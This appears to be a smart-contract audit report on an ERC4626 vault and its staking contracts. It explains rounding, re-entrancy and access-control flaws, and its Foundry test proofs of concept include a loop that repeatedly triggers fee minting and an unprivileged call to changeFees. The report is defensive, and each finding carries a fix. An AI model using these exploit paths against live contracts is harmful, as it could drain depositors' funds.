## [H-01] **Malicious Users Can Drain The Assets Of Vault. (Due to not being ERC4626 Complaint)**

### Impact

Malicious users can drain the assets of the vault.

### POC

The `withdraw` function users `convertToShares` to convert the assets to the amount of shares. These shares are burned from the users account and the assets are returned to the user.

The function `withdraw` is shown below:

```solidity
function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) public nonReentrant syncFeeCheckpoint returns (uint256 shares) {
        if (receiver == address(0)) revert InvalidReceiver();

        shares = convertToShares(assets);
/// .... [skipped the code]
```

The function `convertToShares` is shown below:

```solidity
function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.

        return
            supply == 0
                ? assets
                : assets.mulDiv(supply, totalAssets(), Math.Rounding.Down);
    }
```

It uses `Math.Rounding.Down` , but it should use `Math.Rounding.Up`

Assume that the vault with the following state:

- Total Asset = 1000 WETH
- Total Supply = 10 shares

Assume that Alice wants to withdraw 99 WETH from the vault. Thus, she calls the **`Vault.withdraw(99 WETH)`** function.

The calculation would go like this:

```solidity
assets = 99
return value = assets * supply / totalAssets()
return value = 99 * 10 / 1000
return value = 0
```

The value would be rounded round to zero. This will be the amount of shares burned from users account, which is zero. 

Hence user can drain the assets from the vault without burning their shares. 

> Note : A similar issue also exists in `mint` functionality where `Math.Rounding.Down` is used and `Math.Rounding.Up` should be used.
> 

### Recommendation

Use `Math.Rounding.Up` instead of `Math.Rounding.Down`.

As per OZ implementation here is the rounding method that should be used:

`deposit` : `convertToShares` → `Math.Rounding.Down`

`mint` : `converttoAssets` → `Math.Rounding.Up`

`withdraw` : `convertToShares` → `Math.Rounding.Up`

`redeem` : `convertToAssets` →  `Math.Rounding.Down`

## [H-02] Anyone can call `takeManagementAndPerformanceFees` multiple times to `mint` .

> Note: This bug also exists in AdapterBase.sol in the function `harvest` which has a similar modifier `takeFees`.
> 

### Impact

Taking fees from the contract using the function `takeManagementAndPerformanceFees` decreases the value of shares as new shares are minted. While the management fee can only be consumed per block, the performance fee can be consumed multiple times in a block. Therefore a malicious user can call `takeManagementAndPerformanceFees` multiple times in a block thus reducing the value of shares. 

This can also be timed before a big transaction and thus making another user a victim.

### Vulnerability details and POC

The function `takeManagementAndPerformanceFees` has a `takeFees`  modifier which calls `accruedManagementFee` and `accruedPerformanceFee` . The definiation of `accruedPerformanceFee` is shown below:

```solidity
function accruedPerformanceFee() public view returns (uint256) {
        uint256 highWaterMark_ = highWaterMark;
        uint256 shareValue = convertToAssets(1e18);
        uint256 performanceFee = fees.performance;

        return
            performanceFee > 0 && shareValue > highWaterMark
                ? performanceFee.mulDiv(
                    (shareValue - highWaterMark) * totalSupply(),
                    1e36,
                    Math.Rounding.Down
                )
                : 0;
    }
```

It will return a value > 0 until shareValue > highWaterMark, which will usually be the case as the vault will accure tokens with time. If the malicious user calls this function multiple times the value of shares will keep on decreasing till it reaches highWaterMark.

Let’s assume a scenario where the value of `highWaterMark` is increased to 1.5e18. 

There is also a case written in the test case `test__multiple_mint_deposit_redeem_withdraw:Vault.t.sol` **JUST BEFORE STEP 4.**

I commented out all the steps after step 3, and added the following lines in the test case, here is the complete test case:

```solidity
function test__multiple_mint_deposit_redeem_withdraw() public {

		uint256 mutationassetAmount = 3000;

    asset.mint(alice, 4000);

    vm.prank(alice);
    asset.approve(address(vault), 4000);

    assertEq(asset.allowance(alice, address(vault)), 4000);

    asset.mint(bob, 7001);

    vm.prank(bob);
    asset.approve(address(vault), 7001);

    assertEq(asset.allowance(bob, address(vault)), 7001);

    // 1. Alice mints 2000 shares (costs 2000 tokens)
    vm.prank(alice);
    uint256 aliceassetAmount = vault.mint(2000, alice);

    uint256 aliceShareAmount = vault.previewDeposit(aliceassetAmount);
    assertEq(adapter.afterDepositHookCalledCounter(), 1);

    // Expect to have received the requested mint amount.
    assertEq(aliceShareAmount, 2000);
    assertEq(vault.balanceOf(alice), aliceShareAmount);
    assertEq(vault.convertToAssets(vault.balanceOf(alice)), aliceassetAmount);
    assertEq(vault.convertToShares(aliceassetAmount), vault.balanceOf(alice));

    // Expect a 1:1 ratio before mutation.
    assertEq(aliceassetAmount, 2000);

    // Sanity check.
    assertEq(vault.totalSupply(), aliceShareAmount);
    assertEq(vault.totalAssets(), aliceassetAmount);

    // 2. Bob deposits 4000 tokens (mints 4000 shares)
    vm.prank(bob);
    uint256 bobShareAmount = vault.deposit(4000, bob);
    uint256 bobassetAmount = vault.previewWithdraw(bobShareAmount);
    assertEq(adapter.afterDepositHookCalledCounter(), 2);

    // Expect to have received the requested asset amount.
    assertEq(bobassetAmount, 4000);
    assertEq(vault.balanceOf(bob), 4000);
    assertEq(vault.convertToAssets(vault.balanceOf(bob)), vault.balanceOf(bob));
    assertEq(vault.convertToShares(bobassetAmount),bobassetAmount );

    // Expect a 1:1 ratio before mutation.
    assertEq(bobShareAmount, bobassetAmount);

    // Sanity check.
    uint256 preMutationShareBal = aliceShareAmount + bobShareAmount;
    uint256 preMutationBal = aliceassetAmount + bobassetAmount;
    assertEq(vault.totalSupply(), preMutationShareBal);
    assertEq(vault.totalAssets(), preMutationBal);
    assertEq(vault.totalSupply(), 6000);
    assertEq(vault.totalAssets(), 6000);

    // 3. Vault mutates by +3000 tokens...                    |
    //    (simulated yield returned from adapter)...
    // The Vault now contains more tokens than deposited which causes the exchange rate to change.
    // Alice share is 33.33% of the Vault, Bob 66.66% of the Vault.
    // Alice's share count stays the same but the asset amount changes from 2000 to 3000.
    // Bob's share count stays the same but the asset amount changes from 4000 to 6000.
    asset.mint(address(adapter), mutationassetAmount);
    assertEq(vault.totalSupply(), preMutationShareBal);
    assertEq(vault.totalAssets(), preMutationBal + mutationassetAmount);
    assertEq(vault.balanceOf(alice), aliceShareAmount);
    assertEq(vault.convertToAssets(vault.balanceOf(alice)), aliceassetAmount + (mutationassetAmount / 3) * 1);
    assertEq(vault.balanceOf(bob), bobShareAmount);
    assertEq(vault.convertToAssets(vault.balanceOf(bob)), bobassetAmount + (mutationassetAmount / 3) * 2);

    emit log_named_decimal_uint("Share Value Before" , vault.convertToAssets(1e18), 18);
    _setFees(0,0,1e17,1e17);
    address maluser = vm.addr(0x13337);
    vm.startPrank(maluser);
    for(uint i = 0;i<10000;i++){
      vault.takeManagementAndPerformanceFees();
    }
    vm.stopPrank();
    emit log_named_decimal_uint("Share Value After" , vault.convertToAssets(1e18), 18);
```

The output will show the share value before as `1.500000000000000000` and after as `1.450676982591876208` which cleary shows the value is decreased.

### Recommendation

Set an `onlyOwner` modifier and let the performance fee only be called after certain intervals.

## [H-03] Anyone can call `changeFees` after the quit period has passed and the fee would be nulled out.

### Impact

The `changeFees()` doesn’t have the onlyOwner modifier and hence can be called by anyone. After the quit period is passed a depositer / withdrawer can call this function to null out the values of fees to quickly deposit/withdraw large funds without any fees.

The owner can still call `proposeFees` and then `changeFees` to change the fees again but an attacker can make many transcations before the owner notices.

### POC

```solidity
function proposeFees(VaultFees calldata newFees) external onlyOwner {
        if (
            newFees.deposit >= 1e18 ||
            newFees.withdrawal >= 1e18 ||
            newFees.management >= 1e18 ||
            newFees.performance >= 1e18
        ) revert InvalidVaultFees();

        proposedFees = newFees;
        proposedFeeTime = block.timestamp;

        emit NewFeesProposed(newFees, block.timestamp);
    }

    /// @notice Change fees to the previously proposed fees after the quit period has passed.
    function changeFees() external {
        if (block.timestamp < proposedFeeTime + quitPeriod)
            revert NotPassedQuitPeriod(quitPeriod);

        emit ChangedFees(fees, proposedFees);
        fees = proposedFees;
    }
```

Test case in foundry, written in `Vault.t.sol`

```solidity
function test_changefee() public {
    vm.warp(block.timestamp + 3 days);
    vm.prank(bob);
    vault.changeFees();
    (uint64 deposit,uint64 withdrawal,uint64 management,uint64 performance) = (vault.fees());
    emit log_uint(deposit);
    emit log_uint(withdrawal);
    emit log_uint(management);
    emit log_uint(performance);
  }
```

Result:

```solidity
├─ emit log_uint(: 0) <-deposit
    ├─ emit log_uint(: 0)<-withdrawal
    ├─ emit log_uint(: 0)<-management
    ├─ emit log_uint(: 0)<-performance
```

### Recommendation

Add `onlyOwner` modifier to changeFees.

## [H-04] Use of `transferFrom`.

### Impact

In VaultController.sol the function `fundStakingRewards` takes the funds from `msg.sender` and then transfers it to the staking contract. The function uses `transferFrom` to transfer rewards from `msg.sender` to the VaultController contract. For some ERC20 implementation this function will not revert even if the transaction is unsuccessful (eg: BADGER). It then proceeds on calling the fundReward function in staking contract which takes erc20 tokens from the controller. 

In case such token is used, even if the caller of `fundStakingRewards` doesn’t have enough erc20 tokens to send to the contract, this call would succeed and take those tokens from controller rather than the caller. 

### POC

```solidity
function fundStakingRewards(
    address[] calldata vaults,
    IERC20[] calldata rewardTokens,
    uint256[] calldata amounts
  ) external {
    uint8 len = uint8(vaults.length);

    _verifyEqualArrayLength(len, rewardTokens.length);
    _verifyEqualArrayLength(len, amounts.length);

    address staking;
    for (uint256 i = 0; i < len; i++) {
      staking = vaultRegistry.getVault(vaults[i]).staking;

      rewardTokens[i].transferFrom(msg.sender, address(this), amounts[i]);
      IMultiRewardStaking(staking).fundReward(rewardTokens[i], amounts[i]);
    }
  }
```

### Recommendation

Use `safeTransferFrom` instead of `transferFrom`

## [H-05] `claimRewards` is not re-entrancy safe.

### Impact

In `MultiRewardStaking` the function `claimRewards` doesn’t have `nonReentrant` which makes it possible to re-enter the function. If one of the reward tokens in `ERC-777` token, it is possible to re-enter and claim the reward again and again until the contract is drained out of those tokens.

When the function would be re-entered, it would call `accrueRewards` again which would call `_accrueUser` for _receiver and _caller, it would update the value of accruedRewards again as  `accruedRewards[_user][_rewardToken] += supplierDelta;`  The second time `supplierDelta` would be zero, but the accruedRewards would remain the same. This value is used later in the claimRewards function as `rewardAmount` and sent to the user. 

### POC

```solidity
function claimRewards(address user, IERC20[] memory _rewardTokens) external accrueRewards(msg.sender, user) {
    for (uint8 i; i < _rewardTokens.length; i++) {
      uint256 rewardAmount = accruedRewards[user][_rewardTokens[i]];

      if (rewardAmount == 0) revert ZeroRewards(_rewardTokens[i]);

      EscrowInfo memory escrowInfo = escrowInfos[_rewardTokens[i]];

      if (escrowInfo.escrowPercentage > 0) {
        _lockToken(user, _rewardTokens[i], rewardAmount, escrowInfo);
        emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, true);
      } else {
        _rewardTokens[i].transfer(user, rewardAmount);
        emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, false);
      }

      accruedRewards[user][_rewardTokens[i]] = 0;
    }
  }
```

In the above function the `accruedRewards[user][_rewardTokens[i]]` is updated **after** the tokens are transfered to the user. This makes it possible to steal the rewards multiple times in case of ERC-777 (extension of ERC-20) tokens, which have a callback. 

### Recommendation

Add `nonReentrant` modifier.

## [M-01] Possibily of storage collision which may brick the Adapter.

### Impact

As the strategy implementation is currently not in scope and a user can define it on their own based on their needs, it is possible for strategy to have some storage variables, and for the `harvest` function to work upon those storage variables. 

The function `harvest()` in AdapterBase.sol calls harvest in strategy using a delegate call. If in some case, the delegate call modifies storage variables. Those variables would be modified in adapter and might change some important variables in the adapter contract.

Currently we can’t tell the complete effect this has on adapter contract as the strategy contract can have different implementations, but this design can possibly lead to some storage collision.

### POC

```solidity
function harvest() public takeFees {
        if (
            address(strategy) != address(0) &&
            ((lastHarvest + harvestCooldown) < block.timestamp)
        ) {
            // solhint-disable
            address(strategy).delegatecall(
                abi.encodeWithSignature("harvest()")
            );
        }

        emit Harvested();
    }
```

### Recommendation

If the delegatecall is just used to forward the `msg.sender` (as written in the comments) , use a different approach rather than a delegatecall.  

## [M-02] In `proposeFees` the checks for fees are too high (100%), they should be reduced down to acceptable values.

### Impact

In `proposeFees` there is a condition that checks if the fee is greater than 100%, if it isn’t the value is accepted.  It actual value of fee checks should be very less than that, and hence the checks should be less than 100% too. It might be possible that an owner increases the fee percentage by 100% after the vault has some deposits and users won’t be able to withdraw from the vault as the complete value would be converted to fees.

Even if the owner is truster, it would always be risky for users to deposit in such vaults if the owner if somehow compromised later.

### POC

```solidity
/** @dev Fees can be 0 but never 1e18 (1e18 = 100%, 1e14 = 1 BPS)
     */
    function proposeFees(VaultFees calldata newFees) external onlyOwner {
        if (
            newFees.deposit >= 1e18 ||
            newFees.withdrawal >= 1e18 ||
            newFees.management >= 1e18 ||
            newFees.performance >= 1e18
        ) revert InvalidVaultFees();

        proposedFees = newFees;
        proposedFeeTime = block.timestamp;

        emit NewFeesProposed(newFees, block.timestamp);
    }
```

### Recommendation

Reduce the checks to something less than 10% (or anything acceptable)

## [QA-01] `changeAdapter` should only be called by owner.

## Impact

Altough there is no immediate threat due to this, but this function should only be called by owner. 

### POC

```solidity
function changeAdapter() external takeFees {
        if (block.timestamp < proposedAdapterTime + quitPeriod)
            revert NotPassedQuitPeriod(quitPeriod);

        adapter.redeem(
            adapter.balanceOf(address(this)),
            address(this),
            address(this)
        );

        asset.approve(address(adapter), 0);

        emit ChangedAdapter(adapter, proposedAdapter);

        adapter = proposedAdapter;

        asset.approve(address(adapter), type(uint256).max);

        adapter.deposit(asset.balanceOf(address(this)), address(this));
    }
```

### Recommendation

Add `onlyOwner` modfier to the function.

## [QA-02] Remove the unnecessary variable `assetsCheckpoint` and change the natspec comments regarding that.

The unnecessary variable `assetsCheckpoint` can be removed and the natspec comment of `changeAdapter` has to be modified to remove the variable.

```solidity
* @notice Set a new Adapter for this Vault after the quit period has passed.
     * @dev This migration function will remove all assets from the old Vault and move them into the new vault
     * @dev Additionally it will zero old allowances and set new ones
     * @dev Last we update HWM and assetsCheckpoint for fees to make sure they adjust to the new adapter
     */
    function changeAdapter() external takeFees {
```

## [QA-03] Function state mutability can be restricted to view

src/utils/MultiRewardStaking.sol:351:3:

```solidity
function _calcRewardsEnd(
    uint32 rewardsEndTimestamp,
    uint160 rewardsPerSecond,
    uint256 amount
  ) internal returns (uint32) {
```

src/vault/VaultController.sol:242:3:

```solidity
function _encodeAdapterData(DeploymentArgs memory adapterData, bytes memory baseAdapterData)
    internal
    returns (bytes memory)
```

src/vault/VaultController.sol:667:3:

```solidity
function _verifyCreatorOrOwner(address vault) internal returns (VaultMetadata memory metadata) {
```

## [G-01] In `addRewardToken` of `MultiRewardStaking` , `rewards` is loading the complete struct from storage, but only one variable is needed.

The variable `rewards` in the `addRewardToken` is defined as follows:

```solidity
RewardInfo memory rewards = rewardInfos[rewardToken].lastUpdatedTimestamp;
    if (rewards.lastUpdatedTimestamp > 0) revert RewardTokenAlreadyExist(rewardToken);
```

It is loading the complete struct in the variable rewards and just uses one variable : `lastUpdatedTimestamp` . If only this variable is loaded from storage, less gas would be used. Example code shown below:

```solidity
uint32 lasttimestamp = rewardInfos[rewardToken].lastUpdatedTimestamp;
    if (lasttimestamp > 0) revert RewardTokenAlreadyExist(rewardToken);
```

### Gas usage

**Before**

```solidity
| src/utils/MultiRewardStaking.sol:MultiRewardStaking contract |                 |        |        |        |         |
|--------------------------------------------------------------|-----------------|--------|--------|--------|---------|
| Deployment Cost                                              | Deployment Size |        |        |        |         |
| 3209347                                                      | 16061           |        |        |        |         |
| Function Name                                                | min             | avg    | median | max    | # calls |
| addRewardToken                                               | 103532          | 114244 | 114244 | 124956 | 2       |
```

**After**

```solidity
| Deployment Cost                                              | Deployment Size |        |        |        |         |
| 3193331                                                      | 15981           |        |        |        |         |
| Function Name                                                | min             | avg    | median | max    | # calls |
| addRewardToken                                               | 103272          | 113984 | 113984 | 124697 | 2       |
```